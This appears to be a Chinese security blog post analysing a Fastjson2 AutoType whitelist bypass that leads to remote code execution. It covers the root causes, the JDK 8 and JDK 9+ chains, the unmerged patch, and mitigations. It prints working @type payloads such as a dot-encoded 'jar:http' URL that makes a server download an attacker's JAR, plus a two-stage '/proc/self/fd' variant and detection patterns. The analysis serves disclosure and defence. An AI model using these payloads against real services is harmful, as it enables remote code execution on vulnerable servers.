---
layout: post
title: "Fastjson2 ≤ 2.0.62 AutoType 白名单绕过 RCE 深度分析"
date: 2026-08-05 10:00:00 +0800
categories:
  - Java安全
  - 漏洞分析
tags:
  - Fastjson2
  - AutoType
  - RCE
  - 反序列化
  - JDK
  - ClassLoader
  - Spring Boot
series: Fastjson2 深度分析
series_order: 1
---

# Fastjson2 ≤ 2.0.62 AutoType 白名单绕过 RCE 深度分析

Fastjson2 是 Fastjson 的继任者，也是目前阿里系默认推荐的 JSON 库。历史上 Fastjson 的漏洞大多围绕 AutoType 和 gadget 展开，Fastjson2 则重新设计了 AutoType 的默认策略和白名单机制。但这一次，问题出在白名单机制本身。

先说结论：

1. 漏洞根因不是"某个输入没过滤好"，而是 **AutoType 白名单校验存在三层结构性缺陷**：FNV-1a 哈希白名单只校验哈希不校验文本、类型名中的 URL 特殊字符（`:`、`!`）未过滤、多态反序列化（`@JSONType(seeAlso=...)`）会**自动开启** SupportAutoType。
2. 公开利用链（ObjectReaderSeeAlso 路线）**不需要 FNV 哈希碰撞**，走的是 SupportAutoType 开启后的 fallback 路径，把攻击者控制的类型名直接送进类加载器。
3. JDK 8 下可以一步远程加载恶意 JAR 完成 RCE；JDK 9+ 一阶段会触发 `ClassFormatError`，但远程 JAR 已被下载并缓存，可复用文件描述符做两阶段续接。
4. 官方已确认问题（Issue #7702），但修复 PR #7695 **未合并**，截至分析时所有已发布版本均无正式修复；`-Dfastjson2.parser.safeMode=true` 是目前最直接的缓解手段。

---

## 1. 漏洞入口：多态 DTO + 指定目标类型

典型危险入口是"把请求体解析成带多态注解的具体类型"：

```java
@PostMapping("/parseAnimal")
@ResponseBody
public Map<String, Object> parseAnimal(@RequestBody String payload) {
    // 带 @JSONType(seeAlso=...) 的多态基类 → ObjectReaderSeeAlso
    Object obj = JSON.parseObject(payload, Animal.class);
    ...
}
```

```java
@JSONType(seeAlso = {Dog.class, Cat.class})
public class Animal {
    private String name;
    // getter / setter ...
}

class Dog extends Animal { ... }
class Cat extends Animal { ... }
```

这里有两个关键差异：

- `JSON.parseObject(body, Object.class)`：目标类型是 `Object`，没有多态注解，**安全**，返回普通 `JSONObject`。
- `JSON.parseObject(body, Animal.class)`：目标类型带 `@JSONType(seeAlso=...)`，Fastjson2 会创建 **ObjectReaderSeeAlso**，攻击路径从这里开始。

也就是说，判断风险不能只看"AutoType 开没开"，还要看**解析目标类型本身**。

---

## 2. 根因：AutoType 白名单的三个缺陷

Fastjson2 的 AutoType 校验逻辑在 `ObjectReaderProvider#checkAutoType()`。它把用户可控的 `@type` 交给 `TypeUtils.loadClass()` 之前，先做白名单校验。这个校验存在三个可叠加的缺陷。

### 2.1 缺陷一：FNV-1a 哈希白名单，只校验哈希，不校验文本

Fastjson2 用 FNV-1a 64 位哈希对白名单类名做校验：

```java
long hash = FNV_OFFSET_64;
for (int i = 0; i < typeName.length(); i++) {
    hash ^= typeName.charAt(i);
    hash *= FNV_PRIME_64;
    if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
        clazz = loadClass(typeName);   // ← 仅哈希命中就加载！
    }
}
```

白名单存的是**类名前缀的哈希值**，而不是类名文本本身。默认情况下 `acceptHashCodes` 只有 1 个条目（`-6293031534589903644L`）。

问题在于：哈希命中的是**前缀**，但随后 `loadClass()` 拿到的却是**包含后缀的完整类型名**。

```text
校验：prefix                        （哈希命中即通过）
使用：prefix + suffix               （完整类型名交给类加载器）
```

检查的对象和加载的对象不是同一段文本。攻击者只要让"`!` 之前的某段前缀"碰撞到默认哈希，后面的类名后缀就可以任意指定。这就是"哈希校验无文本验证"的含义。

### 2.2 缺陷二：URL 特殊字符未过滤，`jar:http://` 能抵达类加载器

`TypeUtils.loadClass()` 没有拒绝类型名中的 `:`（协议分隔符）和 `!`（JAR entry 分隔符）。

于是 `@type` 的值不再只是 Java 类名，而可以是一个 URL：

```text
jar:http://attacker:18080/exploit!/Evil
```

`jar:` URL 一旦被交给 `URLClassLoader` 解析，就会触发**远程 JAR 下载**。这是整条链从"类型名"变成"网络请求"的关键。

### 2.3 缺陷三：ObjectReaderSeeAlso 自动开启 SupportAutoType

这是"默认配置（AutoType 关闭）也能打"的关键。

当应用把请求体解析成带 `seeAlso` 的基类时，Fastjson2 会构造 `ObjectReaderSeeAlso`，其构造过程会**自动把 SupportAutoType 特性位打开**：

```java
// ObjectReaderSeeAlso 构造逻辑（示意）
this.features |= JSONReader.Feature.SupportAutoType.mask;
```

再看 `checkAutoType()` 的判定：

```java
if (autoTypeSupport || jsonType || expectClassFlag) {
    // 哈希命中 → loadClass
    // 哈希不命中但 SupportAutoType 已开启 → fallback，同样走到 loadClass
}
```

AutoType 默认关闭时，哈希不命中本该返回 `null` 中断解析；但 SupportAutoType 一旦被 ObjectReaderSeeAlso 打开，**哈希不命中也不会中断**，而是直接 fallback 到 `TypeUtils.loadClass(typeName)`。

这就是公开链"不需要 FNV 碰撞"的原因：它绕过的是白名单校验的**中断分支**，而不是哈希本身。

---

## 3. 从 @type 到类加载：SeeAlso 公开链

把三层缺陷串起来，完整链路如下：

```text
POST /parseAnimal
{"@type":"jar:http:..localhost:18080.exploit!.Evil"}
        │
        ▼
JSON.parseObject(body, Animal.class)
        │  Animal 有 @JSONType(seeAlso=...)
        │  → 使用 ObjectReaderSeeAlso
        ▼
ObjectReaderSeeAlso 构造时 features |= SupportAutoType.mask
        ▼
checkAutoType("jar:http:..localhost:18080.exploit!.Evil", Animal.class, features)
        │  SupportAutoType = ON → 哈希不命中也不返回 null
        ▼
TypeUtils.loadClass(typeName)     ← fallback
        │  线程上下文类加载器.loadClass(name)
        ▼
ClassLoader.checkName —— 类型名没有 '/'，通过
        ▼
URLClassLoader.findClass(name)
        │  path = name.replace('.', '/') + ".class"
        │  path = "jar:http://localhost:18080/exploit!/Evil.class"
        ▼
JarURLConnection → HTTP GET http://localhost:18080/exploit   → 下载 JAR
        ▼
defineClass("jar:http:..localhost:18080.exploit!.Evil", bytes)
        │  字节码内部名与外部名匹配
        │  恶意类 extends Animal 通过 isAssignableFrom 检查
        ▼
Evil.<clinit>() → Runtime.exec(...)   → RCE
```

### 3.1 点号编码绕过 `checkName('/')`

`java.lang.ClassLoader.checkName()` 拒绝二进制名中包含 `/` 的类型名：

```java
private void checkName(String name) {
    if (name.indexOf('/') != -1) {
        throw new NoClassDefFoundError(name);
    }
}
```

但 `URLClassLoader.findClass()` 又会把类型名里的 `.` 还原成 `/`：

```text
外部类型名（载荷）：  jar:http:..localhost:18080.exploit!.Evil
                            ↓ findClass.replace('.', '/')
还原后的资源路径：    jar:http://localhost:18080/exploit!/Evil.class
```

所以攻击者把 URL 里的每个 `/` 编码成 `.`，既绕过了 `checkName`，又让 `findClass` 自动还原：

| 原始 URL 片段 | 点号编码后的类型名 | findClass 还原后 |
|---|---|---|
| `http://` | `http:..` | `http://` |
| `/exploit!/` | `.exploit!.` | `/exploit!/` |
| `/Evil` | `.Evil` | `/Evil` |

### 3.2 寻址约束：host 不能含点号

因为 `.` 会被替换成 `/`，载荷里的 **host 部分不能出现点号**：

| 方案 | 载荷示例 | 说明 |
|---|---|---|
| localhost | `jar:http:..localhost:18080.exploit!.Evil` | 本地测试首选 |
| 十进制 IP | `jar:http:..2130706433:18080.exploit!.Evil` | 公网攻击，`127.0.0.1 → 2130706433` |
| 短主机名 | `jar:http:..attacker:18080.exploit!.Evil` | 目标 hosts/DNS 里配短名 |
| IPv6 | `jar:http:..[2001:db8::1]:18080.exploit!.Evil` | 双方需 IPv6 |

点分 IP `127.0.0.1` 会变成 `127/0/0/1`，域名 `evil.com` 会变成 `evil/com`，都不可用。十进制 IP 是公网远程攻击的常用选择，但要注意目标 JVM 若走 HTTP 代理会出现连接超时，需要 `-Djava.net.useSystemProxies=false` 或直连环境。

### 3.3 字节码内部名与 `defineClass` 匹配

`defineClass` 要求字节码内部的类名把 `/` 换成 `.` 之后，与传入的 `name` 一致：

```text
字节码内部名：      jar:http://localhost:18080/exploit!/Evil
                        ↓ replace('/', '.')
内部名点号形式：    jar:http:..localhost:18080.exploit!.Evil
                        ↓
defineClass name:   jar:http:..localhost:18080.exploit!.Evil   ← 匹配 ✓
```

恶意类需要继承目标基类（本例是 `Animal`），否则会被 `isAssignableFrom()` 检查拦下。所以公开 EXP 的远程类必须用 ASM 直接生成字节码，在字节码层面指定父类为 `com/vuln/fastjson/Animal`，并在 `<clinit>` 静态块里放命令执行逻辑。

---

## 4. JDK 8 为什么直接 RCE，JDK 9+ 为什么失败

本地实测（macOS，JDK 8u461）确认：JDK 8 的 `ClassFileParser` **接受类名中的 `!`**，`jar:http:...exploit!.Evil` 可以完成类定义，静态初始化直接触发。

而 JDK 9+ 对 class 文件内部名称校验更严格，`http://` 的连续斜杠直接报错：

```text
java.lang.ClassFormatError: Illegal class name
  "jar:http://localhost:18080/exploit!/Evil"
```

| 环境 | 一阶段 `jar:http` | 结果 |
|---|---|---|
| JDK 8 | 下载 JAR → defineClass 通过 | **直接 RCE** |
| JDK 9+ | 下载 JAR → defineClass 失败 | ClassFormatError |

注意关键点：**JDK 9+ 虽然类定义失败，但远程 JAR 已经被下载下来了**。这一步的副作用是后续两阶段利用的基础。

---

## 5. 高版本 JDK 的两阶段 FD 续接

JVM 处理 `JarURLConnection` 时会把远程 JAR 缓存到本地临时文件，并保持文件描述符打开。Linux 可以通过 `/proc/self/fd/N`、macOS 通过 `/dev/fd/N` 重新访问进程持有的 fd。

于是 JDK 9+ 的思路变成两段：

```text
阶段 1：jar:http://attacker/payload!/Evil
        → 触发远程 JAR 下载，JVM 缓存为临时文件并保持 fd 打开
        → JDK 9+ 类定义失败（ClassFormatError），但副作用已留下

阶段 2：jar:file:/proc/self/fd/N!/fdN/Evil       （Linux）
        或 jar:file:/dev/fd/N!/fdN/Evil          （macOS）
        → 从本地 fd 重新打开同一个 JAR
        → 内部名不再是 http://，避开一阶段的连续斜杠问题
        → 类定义成功 → <clinit> 执行
```

公开研究在 Spring Boot 2.7 / 3.3 + JDK 21 的 Tomcat、Jetty、Undertow、WebFlux 八组环境里，均观察到"一阶段下载 JAR → ClassFormatError → 复用残留 fd → 二阶段 marker 初始化成功"。

一个需要如实说明的细节：我们本地尝试过的朴素 `/proc/self/fd` 两阶段（2.0.61，非 SeeAlso 入口）是失败的——因为入口没有走到 `TypeUtils.loadClass()`，第一个阶段连远程 JAR 都没下载。**两阶段成立的前提是走 SeeAlso 这类能把类型名送进类加载器的入口**，不能把 Fastjson 1.x 的利用姿势直接套到 fastjson2。

两阶段不是"发两个包就能打穿所有环境"，它依赖一串工程条件：

```text
两次请求进入同一个 JVM
一阶段已下载并打开远程 JAR
类加载器在异常后继续持有缓存 fd
第二阶段命中正确的 fd
操作系统暴露进程 fd 路径
远程类满足目标基类的继承关系
后端允许访问攻击者控制的 HTTP 服务
```

负载均衡、实例扩缩容、fd 生命周期、容器权限和出站策略都会改变成功率。所以"一阶段失败"不能被简单理解为"这个版本不可利用"。

---

## 6. 部署形态与 ClassLoader：决定公开链能走多远

公开 EXP 是否产生远程 JAR 请求，跟 Spring MVC 这个名字无关，真正决定的是**运行时资源解析方式**（ClassLoader）。

| 部署形态 | ClassLoader 特征 | 公开链表现 |
|---|---|---|
| Spring Boot 可执行 JAR（Boot 2.7） | LaunchedURLClassLoader（Tomcat 请求线程为 TomcatEmbeddedWebappClassLoader，父加载器是 Boot 体系） | 远程 JAR 请求 + RCE / FD 续接 |
| Spring Boot 可执行 JAR（Boot 3.3） | 容器 WebApp ClassLoader，但父加载器是 LaunchedClassLoader | 同上 |
| 外置 WAR（Tomcat / Jetty） | 容器 WebApp ClassLoader | 进入 SeeAlso，但无远程请求 |
| 非 Spring（Solon、Jersey、RESTEasy、纯 Java） | 各自类加载器 | 进入 SeeAlso，无远程请求 |

也就是说：

- **Spring Boot 可执行 JAR 是公开链的典型生效场景**。
- 外置 WAR 和非 Spring 应用，根因仍然存在（SeeAlso 一样会建），但**所测部署形态没有产生远程 JAR 请求**，能不能利用取决于容器 ClassLoader 对 `jar:` 资源的解析行为。

判断风险时，要记录的不只是 fastjson2 版本，还包括打包方式、JDK 版本和 ClassLoader 类型。

---

## 7. 官方状态与补丁

### 7.1 官方确认

Fastjson2 维护方在 Issue #7702 的回复中确认了四点：

1. AutoType 类型解析路径存在安全问题；
2. 问题在特定条件下可能被利用；
3. PR #7695 **不是**已合并的正式修复；
4. 正式修复会通过独立 PR 合并，并随后续版本发布。

也就是说，虽然公告建议升级到 2.0.63+，但截至分析时**发布版本中尚无正式修复**，处置状态要以官方新 PR、Release 和安全公告为准。

### 7.2 候选补丁 PR #7695

PR #7695 未合并，但仍有分析价值。它主要做三件事：

```java
// 1. 拒绝 URL 特殊字符（: 和 !）
if (typeName.indexOf(':') >= 0 || typeName.indexOf('!') >= 0) {
    throw new JSONException("autoType is not support. " + typeName);
}

// 2. 哈希命中后核对真实文本前缀
if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
    String prefix = typeName.substring(0, i + 1);
    if (!acceptNameSet.contains(prefix)) {   // 新增文本校验
        continue;
    }
    clazz = loadClass(typeName);
}

// 3. loadClass 前补全统一校验 + 黑名单
if (ClassLoader.class.isAssignableFrom(clazz)
        || JDKUtils.isSQLDataSourceOrRowSet(clazz)) {
    throw new JSONException("autoType is not support.");
}
```

这三处改动指向同一个边界：**用户控制的类型名经过不足的校验进入了类加载器**。

### 7.3 时间线

| 时间 | 事件 |
|---|---|
| 2026-07 | 长亭科技发现并报告，Issue #7702 公开 |
| 2026-07 | 提交候选补丁 PR #7695 |
| 2026-07 | 维护方确认问题存在；PR #7695 关闭，未合并 |
| 截至分析时 | 所有已发布版本均无正式修复 |

---

## 8. 防护建议

正式修复发布前，下面几步已经可以切断公开链的关键位置。

### 8.1 开启 SafeMode（P0）

```bash
-Dfastjson2.parser.safeMode=true
```

兼容属性也有效（两者不要设置成冲突的值）：

```bash
-Dfastjson.parser.safeMode=true
```

修改 JVM 启动参数后需要重启应用。

### 8.2 网关解析 JSON 后拒绝 `@type`（P1）

业务完全不使用多态 `@type` 时，网关可以在任意层级拒绝出现这个键的请求。不要在 Nginx rewrite 阶段用正则匹配 `$request_body`——Nginx 原生正则不理解 JSON 结构，还受请求体落盘、Unicode 转义、压缩影响。更稳妥的做法是让 ModSecurity / Nginx JavaScript / OpenResty Lua 先解析 JSON，再递归检查键名：

```nginx
SecRule REQUEST_HEADERS:Content-Type \
  "@rx (?i)^application/(?:[a-z0-9.+-]+\+)?json" \
  "id:100100,phase:1,pass,nolog,ctl:requestBodyProcessor=JSON"

SecRule ARGS_NAMES "@contains @type" \
  "id:100101,phase:2,deny,status:403,log,msg:'Blocked JSON @type key'"
```

### 8.3 限制后端出站（P2）

公开链需要后端 JVM **主动外连**获取远程 JAR。用容器 NetworkPolicy、主机防火墙或云安全组把出站收敛到业务白名单，重点限制业务 JVM → 公网 HTTP/HTTPS、非必要内网地址、云元数据与管理网段。

### 8.4 资产盘点（P3）

| 排查项 | 方法 |
|---|---|
| fastjson2 版本 | `find . -name "fastjson2-*.jar"` |
| 解析目标类型 | `grep -rn "parseObject.*\.class" --include="*.java" .` |
| SeeAlso 基类 | `grep -rn "@JSONType.*seeAlso" --include="*.java" .` |
| 打包方式 / JDK / 出站策略 / SafeMode | 结合部署清单核对 |

### 8.5 检测特征

建议记录并告警以下请求特征：

```text
"@type"
"jar:http"
"jar:file"
"/proc/self/fd"
"/dev/fd"
```

不要在 WAF 里只按明文正则拦截——`@type`、`jar:`、IP 都可能经过编码、转义或分块传输。十进制 IP（如 `2130706433`）、Unicode 转义、嵌套 JSON 都是常见的绕过方式，语义层检测才有意义。

---

## 9. 总结

这个漏洞的危险性来自三层机制的叠加：

1. **AutoType 白名单校验有结构缺陷**——FNV-1a 哈希只校验哈希不校验文本，检查的对象和加载的对象不是同一段文本；
2. **`jar:http://` 能抵达类加载器**——类型名中的 `:` 和 `!` 未过滤，配合点号编码绕过 `checkName('/')`，一个"类名"就变成了远程 JAR 下载；
3. **多态反序列化自动开启 AutoType**——`@JSONType(seeAlso=...)` 让默认关闭的 AutoType 在特定入口失效，这是"默认配置可攻击"的根本原因。

JDK 8 的链路是直的：

```text
jar:http → getResourceAsStream → loadClass → defineClass → <clinit>
```

JDK 9+ 的链路是绕的：

```text
jar:http → 缓存 JAR 到 fd（一阶段 ClassFormatError）
        → jar:file:/dev/fd/N（或 /proc/self/fd/N）→ defineClass → <clinit>
```

它不是传统 gadget 型反序列化漏洞，而是 Fastjson2 类型探测、JVM ClassLoader 行为和操作系统 fd 机制共同造成的一条跨层利用链。

最后提醒一句：这类漏洞的修复周期往往比人们预期长——"补丁 PR 已提交"不等于"漏洞已修复"。发布版本确认修复之前，**SafeMode + 网关拦截 + 出站白名单**是最可靠的三道闸。

---

## 参考资料

- [Fastjson2 Issue #7702](https://github.com/alibaba/fastjson2/issues/7702)
- [Fastjson2 PR #7695](https://github.com/alibaba/fastjson2/pull/7695)
- [Fastjson2 官方仓库](https://github.com/alibaba/fastjson2)
- [长亭科技 Fastjson2 RCE 分析（微信公众号）](https://mp.weixin.qq.com/s/LJaul1jNjK9pXRAkoUiMEA)
- [Fastjson2 Releases](https://github.com/alibaba/fastjson2/releases)
- [Java ClassLoader 官方文档](https://docs.oracle.com/en/java/javase/25/docs/api/java.base/java/lang/ClassLoader.html)
- [Java URLClassLoader 官方文档](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/net/URLClassLoader.html)
- [Spring Boot Traditional Deployment](https://docs.spring.io/spring-boot/how-to/deployment/traditional-deployment.html)
